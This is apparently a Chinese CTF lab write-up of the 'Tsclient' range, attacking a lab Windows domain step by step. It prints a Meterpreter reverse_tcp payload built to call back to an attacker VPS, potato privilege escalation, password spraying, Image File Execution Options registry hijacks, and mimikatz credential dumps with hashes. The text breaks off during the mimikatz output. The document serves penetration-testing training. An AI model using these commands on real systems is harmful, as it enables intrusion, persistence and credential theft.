---
typora-root-url: 春秋云境Tsclient
title: 春秋云境Tsclient
toc: true
categories:
  - 渗透测试
date: 2025-3-3 22:15:08
tags: 
  - 渗透测试

---

# 春秋云境Tsclient

fsan扫出MSSQL密码

```
E:\Users\tiand>fscan -h 39.99.142.105
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[804ms]     已选择服务扫描模式
[804ms]     开始信息扫描
[804ms]     最终有效主机数量: 1
[804ms]     开始主机扫描
[804ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[804ms]     有效端口数量: 233
[836ms] [*] 端口开放 39.99.142.105:80
[847ms] [*] 端口开放 39.99.142.105:1433
[3.8s]     扫描完成, 发现 2 个开放端口
[3.8s]     存活端口数量: 2
[3.8s]     开始漏洞扫描
[3.8s]     POC加载完成: 总共387个，成功387个，失败0个
[3.9s] [*] 网站标题 http://39.99.142.105      状态码:200 长度:703    标题:IIS Windows Server
[11.7s] [+] MSSQL 39.99.142.105:1433 sa 1qaz!QAZ
[11.7s]     扫描已完成: 3/3
```

## 入口点

mdut连接nt service\mssqlserver权限(服务账户)

potato提权，上传sweetpotato提拿flag

```
[+] Command : "c:\Windows\System32\cmd.exe" /c type C:\Users\Administrator\flag\flag01.txt 
[+] process with pid: 2236 created.

=====================================

 _________  ________  ________  ___       ___  _______   ________   _________   

|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\ 
\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_| 
     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \  
      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \ 
       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|
              \|_________|                                                      


Getting flag01 is easy, right?

flag01: flag{72041b70-6ec8-4428-a299-263931792ca5}


Maybe you should focus on user sessions...

[+] Process created, enjoy!

```

查网卡横向

```
Active code page: 65001

Windows IP Configuration


Ethernet adapter ��̫��:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::ddf0:3cdc:bec7:bdd0%14
   IPv4 Address. . . . . . . . . . . : 172.22.8.18
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.22.255.253

Tunnel adapter isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

```

```
Active code page: 65001

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.46     is alive
[*] Icmp alive hosts len is: 4
172.22.8.18:80 open
172.22.8.18:1433 open
172.22.8.46:445 open
172.22.8.15:445 open
172.22.8.31:139 open
172.22.8.31:445 open
172.22.8.18:445 open
172.22.8.46:139 open
172.22.8.15:139 open
172.22.8.46:135 open
172.22.8.15:135 open
172.22.8.18:139 open
172.22.8.31:135 open
172.22.8.18:135 open
172.22.8.46:80 open
172.22.8.15:88 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo 
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         
[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           
[*] NetInfo 
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] NetInfo 
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:14c9:d206:8af:3d6b:d89c:7196
[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] NetInfo 
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ
已完�?16/16
[*] 扫描结束,耗时: 9.9172437s

172.22.8.18（入口点）
172.22.8.46（WIN2016-IIS）
172.22.8.31（WIN19-CLIENT）
172.22.8.15（DC）
```

## 进程迁移

打不了，先在18机器进行信息搜集

```
chcp 65001&& cd "C:/Users/All Users/"&&sweetpotato -a "quser"
Active code page: 65001
Modifying SweetPotato by Uknow to support webshell
Github: https://github.com/uknowsec/SweetPotato 
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\WIN-WEB/pipe/012d3285-0eff-4ab4-a45c-5ee8ea99499f
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Command : "c:\Windows\System32\cmd.exe" /c quser 
[+] process with pid: 7896 created.

=====================================

 用户�?               会话�?            ID  状��?   空闲时间   登录时间
 john                  rdp-tcp#0           2  运行�?        52  2026/3/3 19:24

[+] Process created, enjoy!


```

发现会话john的rdp连接

想办法迁移进程到这个会话

上线msf

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=vps LPORT=8888 -f exe -o c.exe

meterpreter > getuid
Server username: NT Service\MSSQLSERVER
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 648 created.
Channel 1 created.
Microsoft Windows [�汾 10.0.14393]
(c) 2016 Microsoft Corporation����������Ȩ����

C:\Users\All Users>tasklist
tasklist

ӳ������                       PID �Ự��              �Ự#       �ڴ�ʹ��
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        140 K
smss.exe                       244 Services                   0      1,184 K
csrss.exe                      344 Services                   0      6,292 K
wininit.exe                    420 Services                   0      5,728 K
csrss.exe                      428 Console                    1      5,788 K
winlogon.exe                   480 Console                    1     13,712 K
services.exe                   548 Services                   0      8,400 K
lsass.exe                      556 Services                   0     18,152 K
svchost.exe                    652 Services                   0     19,460 K
svchost.exe                    708 Services                   0     10,468 K
svchost.exe                    848 Services                   0     56,776 K
svchost.exe                    856 Services                   0     58,484 K
dwm.exe                        888 Console                    1     30,488 K
svchost.exe                    924 Services                   0     27,260 K
svchost.exe                   1004 Services                   0     22,924 K
svchost.exe                    340 Services                   0     28,280 K
svchost.exe                      8 Services                   0     16,968 K
svchost.exe                   1040 Services                   0      7,500 K
svchost.exe                   1056 Services                   0     23,412 K
svchost.exe                   1540 Services                   0      6,972 K
spoolsv.exe                   1660 Services                   0     21,872 K
svchost.exe                   1708 Services                   0     10,712 K
svchost.exe                   1724 Services                   0     27,076 K
svchost.exe                   1772 Services                   0      8,332 K
svchost.exe                   1900 Services                   0     11,312 K
svchost.exe                   1952 Services                   0     16,212 K
sqlwriter.exe                 1960 Services                   0      7,976 K
svchost.exe                   1972 Services                   0     11,768 K
svchost.exe                   2008 Services                   0     17,252 K
MsDtsSrvr.exe                 2892 Services                   0     24,412 K
sqlceip.exe                   2900 Services                   0     37,748 K
sqlceip.exe                   2908 Services                   0     63,632 K
sqlceip.exe                   2916 Services                   0     55,484 K
sqlservr.exe                  2928 Services                   0    500,200 K
ReportingServicesService.     2936 Services                   0    119,236 K
msmdsrv.exe                   2336 Services                   0     52,932 K
Microsoft.ReportingServic     3888 Services                   0     85,568 K
conhost.exe                   3896 Services                   0     10,732 K
mpdwsvc.exe                   4180 Services                   0    292,588 K
mpdwsvc.exe                   4184 Services                   0    208,772 K
fdlauncher.exe                4504 Services                   0      5,148 K
fdhost.exe                    4532 Services                   0      6,632 K
conhost.exe                   4540 Services                   0      9,028 K
WmiPrvSE.exe                  4760 Services                   0     18,288 K
LogonUI.exe                   4528 Console                    1     43,760 K
AliYunDunUpdate.exe           5720 Services                   0      9,400 K
csrss.exe                     5712 RDP-Tcp#0                  2      9,048 K
winlogon.exe                  4448 RDP-Tcp#0                  2      8,112 K
dwm.exe                       1304 RDP-Tcp#0                  2     31,524 K
rdpclip.exe                   2760 RDP-Tcp#0                  2     13,268 K
RuntimeBroker.exe             2296 RDP-Tcp#0                  2     17,452 K
svchost.exe                   2988 RDP-Tcp#0                  2     20,172 K
sihost.exe                    2992 RDP-Tcp#0                  2     18,840 K
taskhostw.exe                 2628 RDP-Tcp#0                  2     16,808 K
ChsIME.exe                    5804 RDP-Tcp#0                  2     16,500 K
explorer.exe                  3068 RDP-Tcp#0                  2     60,124 K
ShellExperienceHost.exe       1048 RDP-Tcp#0                  2     35,908 K
SearchUI.exe                  4196 RDP-Tcp#0                  2     36,832 K
jusched.exe                   5600 RDP-Tcp#0                  2     17,320 K
AliYunDun.exe                 1232 Services                   0     15,380 K
argusagent_service.exe        6236 Services                   0      8,436 K
argusagent.exe                6768 Services                   0      9,912 K
conhost.exe                   6752 Services                   0      7,320 K
cmd.exe                       6772 Services                   0      2,772 K
argusagent.exe                6796 Services                   0     81,960 K
msdtc.exe                     2772 Services                   0      9,808 K
AliYunDunMonitor.exe           744 Services                   0     23,604 K
jucheck.exe                   5252 RDP-Tcp#0                  2     14,472 K
svchost.exe                   1032 Services                   0      7,248 K
taskhostw.exe                 2568 RDP-Tcp#0                  2     17,080 K
cmd.exe                       2488 Services                   0      3,036 K
conhost.exe                   3628 Services                   0      9,704 K
SweetPotato.exe               1820 Services                   0     28,856 K
cmd.exe                       5104 Services                   0      2,936 K
conhost.exe                   3336 Services                   0      7,848 K
aliyun_assist_service.exe     5924 Services                   0     23,712 K
cmd.exe                       2712 Services                   0      2,772 K
conhost.exe                   5484 Services                   0      9,688 K
windows_x64_agent.exe         3240 Services                   0     11,664 K
cmd.exe                       2508 Services                   0      2,980 K
conhost.exe                   7784 Services                   0      9,712 K
windows_x86_agent.exe         7916 Services                   0     11,552 K
cmd.exe                       8120 Services                   0      3,076 K
cmd.exe                       7208 Services                   0      3,224 K
SweetPotato.exe               6824 Services                   0     19,844 K
cmd.exe                       2480 Services                   0      3,248 K
SweetPotato.exe               5648 Services                   0     19,844 K
cmd.exe                       7808 Services                   0      3,324 K
PrintSpoofer64.exe            2016 Services                   0      3,812 K
cmd.exe                       7076 Services                   0      3,276 K
w3wp.exe                      7300 Services                   0     13,924 K
cmd.exe                       4952 Services                   0      3,192 K
conhost.exe                   7480 Services                   0      9,724 K
b.exe                         7492 Services                   0      3,172 K
cmd.exe                       7832 Services                   0      2,924 K
conhost.exe                   7544 Services                   0      9,692 K
c.exe                         6964 Services                   0      9,000 K
cmd.exe                        648 Services                   0      3,060 K
conhost.exe                   2436 Services                   0      6,080 K
tasklist.exe                  4652 Services                   0      7,824 K

C:\Users\All Users>exit
exit
meterpreter > migrate 3068
[*] Migrating from 6964 to 3068...
[*] Migration completed successfully.
meterpreter > getuid
Server username: WIN-WEB\John
C:\Windows\system32>chcp 65001&& net use
chcp 65001&& net use
Active code page: 65001
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\C              Microsoft Terminal Services
The command completed successfully.
C:\Windows\system32>dir \\TSCLIENT\C\Users\Administrator
dir \\TSCLIENT\C\Users\Administrator
 Volume in drive \\TSCLIENT\C has no label.
 Volume Serial Number is C2C5-9D0C

 Directory of \\TSCLIENT\C\Users\Administrator

2026/03/03  19:23    <DIR>          .
2026/03/03  19:23    <DIR>          ..
2022/07/11  12:47    <DIR>          3D Objects
2022/07/11  12:47    <DIR>          Contacts
2022/07/11  15:19    <DIR>          Desktop
2022/07/11  14:02    <DIR>          Documents
2022/07/11  12:47    <DIR>          Downloads
2022/07/11  12:47    <DIR>          Favorites
2022/07/11  12:47    <DIR>          Links
2022/07/11  12:47    <DIR>          Music
2022/07/11  12:47    <DIR>          Pictures
2022/07/11  12:47    <DIR>          Saved Games
2022/07/11  12:47    <DIR>          Searches
2022/07/11  12:47    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  30,040,170,496 bytes free
C:\Windows\system32>type \\TSCLIENT\C\credential.txt
type \\TSCLIENT\C\credential.txt
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

有个域账户，不是管理员的话默认可以登录普通域机器

## 密码喷洒

CME先密码喷洒找能登录的机器

```
└─$ proxychains crackmapexec smb 172.22.8.10-50 -u Aldrich -p 'Ald@rLMWuy7Z!#' 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
```

PASSWORD_EXPIRED所以利用 impacket 工具包中的 smbpasswd.py改密码

```
E:\exploit\tools\impacket\examples>python smbpasswd.py  xiaorang.lab/Aldrich:Ald@rLMWuy7Z!#@172.22.8.15 -newpass admin@123
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version
===============================================================================

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

## 映像劫持

然后提示映像劫持，要rdp上去

放大镜

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

五shift

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

或者手动regedit

![image-20260303221731142](image-20260303221731142.png)

锁定账户去触发

![image-20260303221645709](image-20260303221645709.png)

## DC

继续信息收集，寻找去DC路径，看下域管理组用户

```
PS C:\Users\Aldrich> net group  "domain admins" /domain
这项请求将在域 xiaorang.lab 的域控制器处理。

组名     Domain Admins
注释     指定的域管理员

成员

-------------------------------------------------------------------------------
Administrator            WIN2016$
命令成功完成。
```

有win2016$

猕猴桃抓密码直接登

```
privilege::debug
sekurlsa::logonpasswords

Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 31323566 (00000000:01ddf5ae)
Session           : RemoteInteractive from 3
User Name         : hddss
Domain            : WIN2016
Logon Server      : WIN2016
Logon Time        : 2026/3/3 22:24:17
SID               : S-1-5-21-2390134410-2854556611-1869440760-1000
	msv :	
	 [00000003] Primary
	 * Username : hddss
	 * Domain   : WIN2016
	 * NTLM     : 579da618cfbfa85247acf1f800a280a4
	 * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118
	tspkg :	
	wdigest :	
	 * Username : hddss
	 * Domain   : WIN2016
	 * Password : (null)
	kerberos :	
	 * Username : hddss
	 * Domain   : WIN2016
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 31316115 (00000000:01ddd893)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/3 22:24:17
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 11465301 (00000000:00aef255)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/3 21:51:58
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 11465279 (00000000:00aef23f)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/3 21:51:58
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 54935 (00000000:0000d697)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:47
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a
	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN2016$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:46
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : win2016$
	 * Domain   : XIAORANG.LAB
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 31323537 (00000000:01ddf591)
Session           : RemoteInteractive from 3
User Name         : hddss
Domain            : WIN2016
Logon Server      : WIN2016
Logon Time        : 2026/3/3 22:24:17
SID               : S-1-5-21-2390134410-2854556611-1869440760-1000
	msv :	
	 [00000003] Primary
	 * Username : hddss
	 * Domain   : WIN2016
	 * NTLM     : 579da618cfbfa85247acf1f800a280a4
	 * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118
	tspkg :	
	wdigest :	
	 * Username : hddss
	 * Domain   : WIN2016
	 * Password : (null)
	kerberos :	
	 * Username : hddss
	 * Domain   : WIN2016
	 * Password : admin@123
	ssp :	
	credman :	

Authentication Id : 0 ; 31316092 (00000000:01ddd87c)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/3 22:24:17
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 11471949 (00000000:00af0c4d)
Session           : RemoteInteractive from 2
User Name         : Aldrich
Domain            : XIAORANG
Logon Server      : DC01
Logon Time        : 2026/3/3 21:51:58
SID               : S-1-5-21-3289074908-3315245560-3429321632-1105
	msv :	
	 [00000003] Primary
	 * Username : Aldrich
	 * Domain   : XIAORANG
	 * NTLM     : 579da618cfbfa85247acf1f800a280a4
	 * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118
	 * DPAPI    : b13151a9f366fc352d55232f3cd53571
	tspkg :	
	wdigest :	
	 * Username : Aldrich
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Aldrich
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 10549800 (00000000:00a0fa28)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
